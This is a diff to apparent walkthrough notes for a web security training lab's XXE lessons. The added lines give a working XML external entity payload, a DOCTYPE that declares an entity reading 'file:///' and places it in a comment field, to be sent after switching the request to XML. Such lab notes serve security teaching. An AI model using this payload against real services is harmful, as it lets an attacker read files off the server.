@@ -24,6 +24,11 @@ ________________________
 _____________________________________________________________________________________________________________
 Lesson 4 - Modern REST framework
 The same as the previous lesson, just change request header ***Content-Type:application/json to====application/xml****************
+
+dont forget to add this bad boy:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
+<comment><text>&xxe;</text></comment>
 _______________________________________________________________________________________________________________________
 Lesson 7 - Blind XXE assignment
 DTD hosted in WebWolf (see Parameter entities):
